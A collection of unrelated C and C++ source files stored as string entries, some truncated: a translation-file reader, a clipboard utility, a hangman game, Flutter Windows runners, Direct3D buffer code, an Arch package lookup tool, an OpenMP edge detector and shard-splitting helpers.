char* Text(std::string file, std::string tag, bool newLine)\n\t{\n\t\t// read from correct file and correct id\n\t\tIO& io = GetContext();\n\n\t\tif (!io.currentLanguage) {\n\t\t\tio.lastError = \"No language was set\";\n\t\t\treturn \"\";\n\t\t}\n\n\t\tstd::string key(io.currentLanguage);\n\t\tkey.append(\":\");\n\t\tkey.append(file);\n\n\t\tif (io.translations.find(key) != io.translations.end()) {\n\t\t\tif (io.translations[key].Exists(tag)) {\n\t\t\t\tio.lastMessage = io.translations[key][tag].GetString();\n\n\t\t\t\tif (newLine) {\n\t\t\t\t\tio.lastMessage.append(\"\\n\");\n\t\t\t\t}\n\n\t\t\t\treturn io.lastMessage.c_str();\n\t\t\t}\n\t\t\t\n\t\t\tio.lastError = \"Requested tag '\";\n\t\t\tio.lastError.append(tag);\n\t\t\tio.lastError.append(\"' doesn't exists\");\n\t\t\treturn \"\";\n\t\t}\n\n\t\tio.lastError = \"Requested file '\";\n\t\tio.lastError.append(file);\n\t\tio.lastError.append(\"' doesn't exists\");\n\t\treturn \"\";\n\t}\n\n\tconst char* langf::AlphabetToString(Alphabet alphabet)\n\t{\n\t\tswitch (alphabet)\n\t\t{\n\t\t\tcase langf::US_English: return \"en_US.UTF-8\";\n\t\t\tcase German: return \"de_DE.UTF-8\";\n\t\t\tcase Spanish: return \"es_ES.UTF-8\";\n\t\t\tcase French: return \"fr_FR.UTF-8\";\n\t\t\tcase Italian: return \"it_IT.UTF-8\";\n\t\t\tcase Japanese: return \"ja_JP.UTF-8\";\n\t\t\tcase Korean: return \"ko_KR.UTF-8\";\n\t\t\tcase BrazilianPortuguese: return \"pt_BR.UTF-8\";\n\t\t\tcase ChineseSimplified: return \"zh_CN.UTF-8\";\n\t\t\tcase ChineseTraditional: return \"zh_TW.UTF-8\";\n\t\t}\n\n\t\tIO& io = GetContext();\n\t\tio.lastError = \"Requested alphabet '\";\n\t\tio.lastError.append(std::to_string(alphabet));\n\t\tio.lastError.append(\"' is invalid\");\n\n\t\treturn \"\";\n\t}\n\n\tconst char* GetLastError()\n\t{\n\t\treturn GetContext().lastError.c_str();\n\t}\n\n\tvoid RemoveWhiteSpaces(std::string& str)\n\t{\n\t\tstr.erase(0, str.find_first_not_of(\" \\t\\n\\r\\f\\v\"));\n\t\tstr.erase(str.find_last_not_of(\" \\t\\n\\r\\f\\v\") + 1);\n\t}\n\n\tbool Translation::Read(Translation& dataFile, const std::string& path, char separator)\n\t{\n\t\tstd::ifstream file(path);\n\n\t\tif (file.is_open()) {\n\t\t\t// variables may be outside the loop and we may need to refer to previous iterations\n\t\t\tstd::string propName = {};\n\t\t\tstd::string propValue = {};\n\n\t\t\t// using a stack to handle the reading\n\t\t\t// may re-factor this later\n\t\t\tstd::stack<std::reference_wrapper<Translation>> dfStack;\n\t\t\tdfStack.push(dataFile);\n\n\t\t\twhile (!file.eof()) {\n\t\t\t\tstd::string line;\n\t\t\t\tstd::getline(file, line);\n\n\t\t\t\tRemoveWhiteSpaces(line);\n\n\t\t\t\t// line is not empty\n\t\t\t\tif (line.empty()) {\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t// test if it's a comment\n\t\t\t\tif (line[0] == '#') {\n\t\t\t\t\tTranslation comment;\n\t\t\t\t\tcomment.mIsComment = true;\n\t\t\t\t\tdfStack.top().get().mObjectVec.push_back({ line, comment });\n\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\t// check if equa",
    "/*\n * This file is a part of u8clip.\n *\n * Copyright (c) 2024 Flokart World, Inc.\n * All rights reserved.\n */\n\n#include <windows.h>\n#include <iostream>\n#include <string>\n#include <utility>\n\nnamespace {\n\ntemplate <typename T>\nclass scope_exit {\nprivate:\n    T M_core;\n\npublic:\n    scope_exit(T &&core) : M_core(std::forward<T>(core)) {\n    }\n\n    ~scope_exit() {\n        M_core();\n    }\n};\n\n} // namespace\n\nint main() {\n    std::string input(std::istreambuf_iterator<char>(std::cin), {});\n    int required_wchars =\n            MultiByteToWideChar(CP_UTF8,\n                                0,\n                                input.data(),\n                                static_cast<int> (input.size()),\n                                nullptr,\n                                0)\n            + 1;\n    for (auto c : input) {\n        if (c == u8'\\n') {\n            ++required_wchars;\n        }\n    }\n\n    HGLOBAL memory =\n            GlobalAlloc(GMEM_FIXED, required_wchars * sizeof (wchar_t));\n    if (!memory) {\n        std::cerr << \"ERROR: GlobalAlloc failed.\" << std::endl;\n        return 1;\n    }\n    auto free = scope_exit([memory]() { GlobalFree(memory); });\n\n    if (auto dst = reinterpret_cast<wchar_t *> (GlobalLock(memory)); dst) {\n        auto end = dst + required_wchars;\n        std::size_t last = 0;\n        do {\n            auto rest = static_cast<int> (end - dst);\n            std::size_t delim_pos = input.find(u8'\\n', last);\n            if (delim_pos == std::string::npos) {\n                MultiByteToWideChar(CP_UTF8,\n                                    0,\n                                    input.data() + last,\n                                    static_cast<int> (input.size() - last),\n                                    dst,\n                                    rest);\n                break;\n            } else {\n                int len =\n                        MultiByteToWideChar(\n                                CP_UTF8,\n                                0,\n                                input.data() + last,\n                                static_cast<int> (delim_pos - last),\n                                dst,\n                                rest);\n                dst[len] = L'\\r';\n                dst[len + 1] = L'\\n';\n                dst[len + 2] = L'\\0';\n                dst += len + 2;\n                last = delim_pos + 1;\n            }\n        } while (last < input.size());\n\n        GlobalUnlock(memory);\n    } else {\n        std::cerr << \"ERROR: GlobalLock failed.\" << std::endl;\n        return 2;\n    }\n\n    if (!OpenClipboard(nullptr)) {\n        std::cerr << \"ERROR: OpenClipboard failed.\" << std::endl;\n        return 3;\n    }\n    auto close = scope_exit([]() { CloseClipboard(); });\n\n    /* Required to take ownership */\n    if (!EmptyClipboard()) {\n        std::cerr << \"ERROR: EmptyClipboard failed.\" << std::endl;\n        return 4;\n    }\n\n    if (!SetClipboardData(CF_UNICODETEXT, memory)) {\n        std::cerr << \"ERROR: SetClipboardData failed.\" << std::endl;\n        return 5;\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n\r\nusing namespace std;\r\n\r\nint main(){\r\n    char palavra[50],secreta[50],letra[1];\r\n    int i, tam, chances, acertos;\r\n    bool acerto=false;\r\n\r\n    chances =6;\r\n    tam=0;\r\n    i=0;\r\n    acerto=false;\r\n    acertos=0;\r\n\r\n\r\n    cout << \"escolha uma palavra: \";\r\n    cin >> palavra;\r\n    system(\"cls\");\r\n\r\n    while (palavra[i] != '\\0'){\r\n        i++;\r\n        tam++;\r\n    }\r\n\r\n    for (i=0;i<30;i++){\r\n        secreta[i] = '-';\r\n    }\r\n    while((chances > 0) && (acertos < tam)){\r\n        cout << \"Chances restantes: \" << chances << \"\\n\\n\";\r\n        cout << \"Palavra secreta: \";\r\n        for (i=0; i<tam; i++){\r\n            cout << secreta[i];\r\n        }\r\n        cout << \"\\n\\ndigite uma letra: \\n\";\r\n        cin >> letra[0];\r\n        for (i=0; i<tam;i++){\r\n            if(palavra[i]==letra[0]){\r\n                acerto=true;\r\n                secreta[i]=palavra[i];\r\n                acertos++;\r\n            }\r\n        }\r\n        if(!acerto){\r\n            chances--;\r\n        }\r\n        acerto=false;\r\n    }\r\n    if (acertos == tam){\r\n        cout << \"VENCEU!:)\\n\\n\";\r\n    }\r\n    else{\r\n        cout << \"PERDEU!:(\" << \"\\n\";\r\n    }\r\n    cout << \"FIM !!!!!!\";\r\n    return 0;\r\n}\r\n",
    "/////////////////////////////////////////////////////\n// CIS554 Object Oriented Programming in C++\n// Exercise 5_5 - Function overloading\n/////////////////////////////////////////////////////\n#include <iostream>\nusing std::cin;\nusing std::cout;\n\n// Function to compute the sum of numbers from 1 to N recursively\nint sum_recursive(int N)\n{\n    if (N <= 1)\n    {\n        return N; // Base case: if N is 1 or less, return N\n    }\n    return N + sum_recursive(N - 1); // Recursive case: add N to the sum of numbers from 1 to N-1\n}\n\nint main()\n{\n    int N;\n    std::cout << \"Enter a positive integer: \";\n    std::cin >> N;\n\n    if (N <= 0)\n    {\n        std::cout << \"Please enter a positive integer.\" << std::endl;\n        return 1; // Exit the program with an error code if the input is not positive\n    }\n\n    int sum = sum_recursive(N);\n    std::cout << \"The sum of all numbers from 1 to \" << N << \" is \" << sum << std::endl;\n    // Wait for user input before closing the program\n    cout << \"Press Enter to exit...\";\n    cin.ignore(); // Ignore any leftover newline character in the buffer\n    cin.get();    // Wait for user to press Enter\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expense_tracker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"business_card\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"stdafx.h\"\n#pragma hdrstop\n\n#include \"ResourceManager.h\"\n#include \"R_DStreams.h\"\n\n#include \"../xrRender/dxRenderDeviceRender.h\"\n//////////////////////////////////////////////////////////////////////\n// Construction/Destruction\n//////////////////////////////////////////////////////////////////////\n\nint rsDVB_Size = 4096; //512+1024; //what the fuck. it should be 4096\nint rsDIB_Size = 512;\n\nvoid _VertexStream::Create()\n{\n\t//dxRenderDeviceRender::Instance().Resources->Evict\t\t();\n\tDEV->Evict();\n\n\tmSize = rsDVB_Size * 1024;\n#if defined(USE_DX10) || defined(USE_DX11)\n\tD3D_BUFFER_DESC bufferDesc;\n\tbufferDesc.ByteWidth = mSize;\n\tbufferDesc.Usage = D3D_USAGE_DYNAMIC;\n\tbufferDesc.BindFlags = D3D_BIND_VERTEX_BUFFER;\n\tbufferDesc.CPUAccessFlags = D3D_CPU_ACCESS_WRITE;\n\tbufferDesc.MiscFlags = 0;\n\n\tR_CHK(HW.pDevice->CreateBuffer ( &bufferDesc, 0, &pVB ));\n\tHW.stats_manager.increment_stats_vb(pVB);\n#else\t//\tUSE_DX10\n\tR_CHK(HW.pDevice->CreateVertexBuffer ( mSize, D3DUSAGE_WRITEONLY|D3DUSAGE_DYNAMIC, 0, D3DPOOL_DEFAULT, &pVB, NULL));\n\tHW.stats_manager.increment_stats_vb(pVB);\n#endif\t//\tUSE_DX10\n\n\tR_ASSERT(pVB);\n\n\tmPosition = 0;\n\tmDiscardID = 0;\n\n\tMsg(\"* DVB created: %dK\", mSize / 1024);\n}\n\nvoid _VertexStream::Destroy()\n{\n\tHW.stats_manager.decrement_stats_vb(pVB);\n\t_RELEASE(pVB);\n\t_clear();\n}\n\nvoid* _VertexStream::Lock(u32 vl_Count, u32 Stride, u32& vOffset)\n{\n#ifdef USE_DX11\n\tD3D11_MAPPED_SUBRESOURCE MappedSubRes;\n#endif\n\n#ifdef DEBUG\n\tPGO\t\t\t\t\t(Msg(\"PGO:VB_LOCK:%d\",vl_Count));\n\tVERIFY\t\t\t\t(0==dbg_lock);\n\tdbg_lock\t\t\t++;\n#endif\n\n\t// Ensure there is enough space in the VB for this data\n\tu32 bytes_need = vl_Count * Stride;\n\tR_ASSERT2((bytes_need<=mSize) && vl_Count,\n\t          make_string(\"bytes_need = %d, mSize = %d, vl_Count = %d\", bytes_need, mSize, vl_Count));\n\n\t// Vertex-local info\n\tu32 vl_mSize = mSize / Stride;\n\tu32 vl_mPosition = mPosition / Stride + 1;\n\n\t// Check if there is need to flush and perform lock\n\tBYTE* pData = 0;\n\tif ((vl_Count + vl_mPosition) >= vl_mSize)\n\t{\n\t\t// FLUSH-LOCK\n\t\tmPosition = 0;\n\t\tvOffset = 0;\n\t\tmDiscardID ++;\n\n#if defined(USE_DX11)\n\t\tHW.pContext->Map(pVB, 0, D3D_MAP_WRITE_DISCARD, 0, &MappedSubRes);\n\t\tpData = (BYTE*)MappedSubRes.pData;\n\t\tpData += vOffset;\n#elif defined(USE_DX10)\n\t\tpVB->Map(D3D_MAP_WRITE_DISCARD, 0, (void**)&pData);\n\t\tpData += vOffset;\n#else\t//\tUSE_DX10\n\t\tHRESULT res = pVB->Lock(mPosition, bytes_need, (void**)&pData, LOCKFLAGS_FLUSH);\n\n\t\tif (res != D3D_OK)\n\t\t\tMsg(\" pVB->Lock - failed: res = %d,mPosition = %d, bytes_need = %d, &pData = %x, LOCKFLAGS_FLUSH\", res,\n\t\t\t    mPosition, bytes_need, (void**)&pData);\n\n#endif\t//\tUSE_DX10\n\t}\n\telse\n\t{\n\t\t// APPEND-LOCK\n\t\tmPosition = vl_mPosition * Stride;\n\t\tvOffset = vl_mPosition;\n\n#if defined(USE_DX11)\n\t\tHW.pContext->Map(pVB, 0, D3D_MAP_WRITE_NO_OVERWRITE, 0, &MappedSubRes);\n\t\tpData = (BYTE*)MappedSubRes.pData;\n\t\tpData += vOffset * Stride;\n#elif defined(USE_DX10)\n\t\tpVB->Map(D3D_MAP_WRITE_NO_OVERWRITE, 0, (void**)&pData);\n\t\tpData += vOffset * Stride;\n#else\t//\tUSE_DX10\n\t\tHRESULT res = pVB->Lock(mPosition, bytes_need, (void**)&pData, LOCKFLAGS_APPEND);\n\n\t\tif (res != D3D_OK)\n\t\t\tMsg(\" pVB->Lock - failed: res = %d,mPosition = %d, bytes_need = %d, &pData = %x, LOCKFLAGS_APPEND\", res,\n\t\t\t    mPosition, bytes_need, (void**)&pData);\n\n#endif\t//\tUSE_DX10\n\t}\n\tVERIFY(pData);\n\n\treturn LPVOID(pData);\n}\n\nvoid _VertexStream::Unlock(u32 Count, u32 Stride)\n{\n#ifdef DEBUG\n\tPGO\t\t\t\t\t(Msg(\"PGO:VB_UNLOCK:%d\",Count));\n\tVERIFY\t\t\t\t(1==dbg_lock);\n\tdbg_lock\t\t\t--;\n#endif\n\tmPosition += Count * Stride;\n\n\tVERIFY(pVB);\n\n#if defined(USE_DX11)\n\tHW.pContext->Unmap(pVB, 0);\n#elif defined(USE_DX10)\n\tpVB->Unmap();\n#else\t//\tUSE_DX10\n\tpVB->Unlock();\n#endif\t//\tUSE_DX10\n}\n\nvoid _VertexStream::reset_begin()\n{\n\told_pVB = pVB;\n\tDestroy();\n}\n\nvoid _VertexStream::reset_end()\n{\n\tCreate();\n\t//old_pVB\t\t\t\t= NULL;\n}\n\n_VertexStream::_VertexStream()\n{\n\t_clear();\n};\n\nvoid _VertexStream::_clear()\n{\n\tpVB = NULL;\n\tmSize = 0;\n\tmPosition = 0;\n\tmDiscardID = 0;\n#ifdef DEBUG\n\tdbg_lock\t= 0;\n#endif\n}\n\n//////////////////////////////////////////////////////////////////////////\nvoid _IndexStream::Create()\n{\n\t//dxRenderDeviceRender::Instance().Resources->Evict\t\t();\n\tDEV->Evict();\n\n\tmSize = rsDIB_Size * 1024;\n\n#if defined(USE_DX10) || defined(USE_DX11)\n\tD3D_BUFFER_DESC bufferDesc;\n\tbufferDesc.ByteWidth = mSize;\n\tbufferDesc.Usage = D3D_USAGE_DYNAMIC;\n\tbufferDesc.BindFlags = D3D_BIND_INDEX_BUFFER;\n\tbufferDesc.CPUAccessFlags = D3D_CPU_ACCESS_WRITE;\n\tbufferDesc.MiscFlags = 0;\n\n\tR_CHK(HW.pDevice->CreateBuffer( &bufferDesc, 0, &pIB ));\n\tHW.stats_manager.increment_stats_ib(pIB);\n#else\t//\tUSE_DX10\n\tR_CHK(HW.pDevice->CreateIndexBuffer( mSize, D3DUSAGE_WRITEONLY|D3DUSAGE_DYNAMIC, D3DFMT_INDEX16, D3DPOOL_DEFAULT, &\n\t\tpIB, NULL));\n\tHW.stats_manager.increment_stats_ib(pIB);\n#endif\t//\tUSE_DX10\n\tR_ASSERT(pIB);\n\n\tmPosition = 0;\n\tmDiscardID = 0;\n\n\tMsg(\"* DIB created: %dK\", mSize / 1024);\n}\n\nvoid _IndexStream::Destroy()\n{\n\tHW.stats_manager.decrement_stats_ib(pIB);\n\t_RELEASE(pIB);\n\t_clear();\n}\n\nu16* _IndexStream::Lock(u32 Cou",
    "#include <iostream>\n#include <string>\n#include <sstream>\n#include <curl/curl.h>\n#include <json/json.h>\n\nstatic size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {\n    ((std::string*)userp)->append((char*)contents, size * nmemb);\n    return size * nmemb;\n}\n\nstd::string fetch_package_info(const std::string& url) {\n    CURL* curl;\n    CURLcode res;\n    std::string readBuffer;\n\n    curl = curl_easy_init();\n    if (curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n    return readBuffer;\n}\n\nstd::string join_json_array(const Json::Value& array) {\n    std::ostringstream oss;\n    for (Json::Value::ArrayIndex i = 0; i < array.size(); ++i) {\n        if (i > 0) {\n            oss << \", \";\n        }\n        oss << array[i].asString();\n    }\n    return oss.str();\n}\n\nstd::string safe_as_string(const Json::Value& value) {\n    return value.isString() ? value.asString() : \"\";\n}\n\nvoid parse_and_print_package_info(const std::string& json_data, bool is_official, bool& found) {\n    Json::Value root;\n    Json::CharReaderBuilder builder;\n    std::string errs;\n    std::istringstream s(json_data);\n\n    if (Json::parseFromStream(builder, s, &root, &errs)) {\n        if (is_official) {\n            if (!root[\"results\"].empty()) {\n                found = true;\n                const auto& pkg = root[\"results\"][0];\n                std::cout << \"Package Name: \" << safe_as_string(pkg[\"pkgname\"]) << std::endl;\n                std::cout << \"Description: \" << safe_as_string(pkg[\"pkgdesc\"]) << std::endl;\n                std::cout << \"Repository: \" << safe_as_string(pkg[\"repo\"]) << std::endl;\n                std::cout << \"Version: \" << safe_as_string(pkg[\"pkgver\"]) << std::endl;\n                std::cout << \"URL: \" << safe_as_string(pkg[\"url\"]) << std::endl;\n                std::cout << \"License: \" << (pkg[\"licenses\"].isArray() ? join_json_array(pkg[\"licenses\"]) : safe_as_string(pkg[\"licenses\"])) << std::endl;\n                std::cout << \"Dependencies: \" << (pkg[\"depends\"].isArray() ? join_json_array(pkg[\"depends\"]) : safe_as_string(pkg[\"depends\"])) << std::endl;\n            }\n        } else {\n            if (!root[\"results\"].empty()) {\n                found = true;\n                const auto& pkg = root[\"results\"][0];\n                std::cout << \"Package Name: \" << safe_as_string(pkg[\"Name\"]) << std::endl;\n                std::cout << \"Description: \" << safe_as_string(pkg[\"Description\"]) << std::endl;\n                std::cout << \"Repository: AUR\" << std::endl;\n                std::cout << \"Version: \" << safe_as_string(pkg[\"Version\"]) << std::endl;\n                std::cout << \"URL: \" << safe_as_string(pkg[\"URL\"]) << std::endl;\n                std::cout << \"License: \" << safe_as_string(pkg[\"License\"]) << std::endl;\n                std::cout << \"Dependencies: \" << (pkg[\"Depends\"].isArray() ? join_json_array(pkg[\"Depends\"]) : safe_as_string(pkg[\"Depends\"])) << std::endl;\n            }\n        }\n    } else {\n        std::cerr << \"Failed to parse JSON: \" << errs << std::endl;\n    }\n}\n\nint main(int argc, char** argv) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <package_name>\" << std::endl;\n        return 1;\n    }\n\n    std::string package_name = argv[1];\n    std::string official_url = \"https://archlinux.org/packages/search/json/?name=\" + package_name;\n    std::string aur_url = \"https://aur.archlinux.org/rpc/?v=5&type=info&arg[]=\" + package_name;\n\n    bool found = false;\n\n    std::string official_data = fetch_package_info(official_url);\n    parse_and_print_package_info(official_data, true, found);\n\n    std::string aur_data = fetch_package_info(aur_url);\n    parse_and_print_package_info(aur_data, false, found);\n\n    if (!found) {\n        std::cout << \"Package not found in either official repositories or AUR.\" << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <string.h>\n#include <omp.h>\n#include <jpeglib.h>\n#include <time.h>\n\n#define IMAGE_WIDTH 30000\n#define IMAGE_HEIGHT 22943\n#define RGB_CHANNELS 3\n\ntypedef struct {\n    uint8_t red;\n    uint8_t green;\n    uint8_t blue;\n} RGBPixel;\n\ntypedef struct {\n    uint8_t gray;\n} GrayPixel;\n\nRGBPixel** img;\nGrayPixel** grayscale;\nGrayPixel** edges;\n\nvoid allocateMemory() {\n    img = (RGBPixel**) malloc(IMAGE_HEIGHT * sizeof(*img));\n    grayscale = (GrayPixel**) malloc(IMAGE_HEIGHT * sizeof(*grayscale));\n    edges = (GrayPixel**) malloc(IMAGE_HEIGHT * sizeof(*edges));\n    \n    for (int i = 0; i < IMAGE_HEIGHT; i++) {\n        img[i] = (RGBPixel*) malloc(IMAGE_WIDTH * sizeof(**img));\n        grayscale[i] = (GrayPixel*) malloc(IMAGE_WIDTH * sizeof(**grayscale));\n        edges[i] = (GrayPixel*) malloc(IMAGE_WIDTH * sizeof(**edges));\n    }\n}\n\nvoid freeMemory() {\n    for (int i = 0; i < IMAGE_HEIGHT; i++) {\n        free(img[i]);\n        free(grayscale[i]);\n        free(edges[i]);\n    }\n    free(img);\n    free(grayscale);\n    free(edges);\n}\n\nvoid grayscaleConversion() {\n    #pragma omp parallel for\n    for (int y = 0; y < IMAGE_HEIGHT; y++) {\n        \n        for (int x = 0; x < IMAGE_WIDTH; x++) {\n            grayscale[y][x].gray = (uint8_t)((0.3 * img[y][x].red) +\n                                              (0.59 * img[y][x].green) +\n                                              (0.11 * img[y][x].blue));\n        }\n    }\n}\n\n/*void sobelEdgeDetection() {\n    int Gx[3][3] = {{-1, 0, 1}, {-2, 0, 2}, {-1, 0, 1}};\n    int Gy[3][3] = {{-1, -2, -1}, {0,  0,  0}, {1,  2,  1}};\n\n    #pragma omp parallel for collapse(2)\n    for (int y = 1; y < IMAGE_HEIGHT - 1; y++) {\n        for (int x = 1; x < IMAGE_WIDTH - 1; x++) {\n            int gradient_x = 0;\n            int gradient_y = 0;\n\n            \n            for (int dy = -1; dy <= 1; dy++) {\n                for (int dx = -1; dx <= 1; dx++) {\n                    gradient_x += Gx[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                    gradient_y += Gy[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                }\n            }\n\n            int gradient = abs(gradient_x) + abs(gradient_y);\n            edges[y][x].gray = (uint8_t)(gradient > 255 ? 255 : gradient);\n        }\n    }\n}*/\n\n/*void sobelEdgeDetection() {\n    #pragma omp parallel\n    {\n        // Private buffers for each thread\n        GrayPixel** private_edges = (GrayPixel**) malloc(IMAGE_HEIGHT * sizeof(*private_edges));\n        for (int i = 0; i < IMAGE_HEIGHT; i++) {\n            private_edges[i] = (GrayPixel*) calloc(IMAGE_WIDTH, sizeof(**private_edges));\n        }\n\n        #pragma omp for collapse(2)\n        for (int y = 1; y < IMAGE_HEIGHT - 1; y++) {\n            for (int x = 1; x < IMAGE_WIDTH - 1; x++) {\n                int gradient_x = 0;\n                int gradient_y = 0;\n                int Gx[3][3] = {{-1, 0, 1}, {-2, 0, 2}, {-1, 0, 1}};\n                int Gy[3][3] = {{-1, -2, -1}, {0,  0,  0}, {1,  2,  1}};\n                \n                for (int dy = -1; dy <= 1; dy++) {\n                    for (int dx = -1; dx <= 1; dx++) {\n                        gradient_x += Gx[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                        gradient_y += Gy[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                    }\n                }\n                int gradient = abs(gradient_x) + abs(gradient_y);\n                private_edges[y][x].gray = (uint8_t)(gradient > 255 ? 255 : gradient);\n            }\n        }\n\n        // Merge results\n        #pragma omp critical\n        {\n            for (int y = 1; y < IMAGE_HEIGHT - 1; y++) {\n                for (int x = 1; x < IMAGE_WIDTH - 1; x++) {\n                    edges[y][x].gray = private_edges[y][x].gray;\n                }\n            }\n        }\n\n        for (int i = 0; i < IMAGE_HEIGHT; i++) {\n            free(private_edges[i]);\n        }\n        free(private_edges);\n    }\n}*/\n\nvoid sobelEdgeDetection() {\n    int Gx[3][3] = {{-1, 0, 1}, {-2, 0, 2}, {-1, 0, 1}};\n    int Gy[3][3] = {{-1, -2, -1}, {0,  0,  0}, {1,  2,  1}};\n\n    #pragma omp parallel for \n    for (int y = 1; y < IMAGE_HEIGHT - 1; y++) {\n        for (int x = 1; x < IMAGE_WIDTH - 1; x++) {\n            int gradient_x = 0;\n            int gradient_y = 0;\n            int  num_threads_used = omp_get_num_threads();\n            printf(\"Number of threads used in sobelEdgeDetection: %d\\n\", num_threads_used);\n\n            \n            for (int dy = -1; dy <= 1; dy++) {\n                for (int dx = -1; dx <= 1; dx++) {\n                    gradient_x += Gx[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                    gradient_y += Gy[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                }\n            }\n\n            int gradient = abs(gradient_x) + abs(gradient_y);\n            edges[y][x].gray = (uint8_t)(gradient > 255 ? 255 : gradient);\n        }\n    }\n}\n\nvoid loadJPEGImage(const char *filename) {\n    ",
    "#include \"common/shard.hpp\"\n\nstd::pair<Shard, Shard> split_shard(const Shard& shard) {\n  assert(shard.lower != shard.upper);\n  size_t lower = str_to_bucket(shard.lower), upper = str_to_bucket(shard.upper);\n  uint64_t midpoint = lower + (upper - lower) / 2;\n  // get new bounds for each shard (upper bound of lower shard, and lower bound\n  // of upper shard)\n  std::string lower_upper = bucket_to_str(midpoint, shard.granularity()),\n              upper_lower = bucket_to_str(midpoint + 1, shard.granularity());\n  return std::pair<Shard, Shard>{{shard.lower, lower_upper},\n                                 {upper_lower, shard.upper}};\n}\n\nstd::pair<Shard, Shard> split_shard(const Shard& shard, uint64_t at) {\n  size_t lower = str_to_bucket(shard.lower), upper = str_to_bucket(shard.upper);\n  assert(lower < upper);\n  // get new bounds for each shard (upper bound of lower shard, and lower bound\n  // of upper shard)\n  std::string lower_upper = bucket_to_str(at, shard.granularity()),\n              upper_lower = bucket_to_str(at + 1, shard.granularity());\n  return std::pair<Shard, Shard>{{shard.lower, lower_upper},\n                                 {upper_lower, shard.upper}};\n}\n\nstd::pair<Shard, Shard> split_shard(const Shard& shard, const std::string& at,\n                                    bool first) {\n  // check that shard is larger than 1, and split location is within range\n  assert(shard.lower != shard.upper);\n  assert(shard.lower <= at && at <= shard.upper);\n  size_t pos = str_to_bucket(at);\n  // get new bounds for each shard (upper bound of lower shard, and lower bound\n  // of upper shard)\n  std::string lower_upper = bucket_to_str(pos - !first, shard.granularity()),\n              upper_lower = bucket_to_str(pos + first, shard.granularity());\n  return std::pair<Shard, Shard>{{shard.lower, lower_upper},\n                                 {upper_lower, shard.upper}};\n}\n\nOverlapStatus get_overlap(const Shard& a, const Shard& b) {\n  if (a.upper < b.lower || b.upper < a.lower) {\n    /**\n     * A: [-----]\n     * B:         [-----]\n     * Note: this also includes the flipped case (where B's keys are entirely\n     * before A's)\n     */\n    return OverlapStatus::NO_OVERLAP;\n  } else if (b.lower <= a.lower && a.upper <= b.upper) {\n    /**\n     * A:    [----]\n     * B:  [--------]\n     * Note: This also includes the case where the two shards are equal!\n     */\n    return OverlapStatus::COMPLETELY_CONTAINED;\n  } else if (a.lower < b.lower && a.upper > b.upper) {\n    /**\n     * A: [-------]\n     * B:   [---]\n     */\n    return OverlapStatus::COMPLETELY_CONTAINS;\n  } else if (a.lower >= b.lower && a.upper > b.upper) {\n    /**\n     * A:    [-----]\n     * B: [----]\n     */\n    return OverlapStatus::OVERLAP_START;\n  } else if (a.lower < b.lower && a.upper <= b.upper) {\n    /**\n     * A: [-------]\n     * B:    [------]\n     */\n    return OverlapStatus::OVERLAP_END;\n  } else {\n    throw 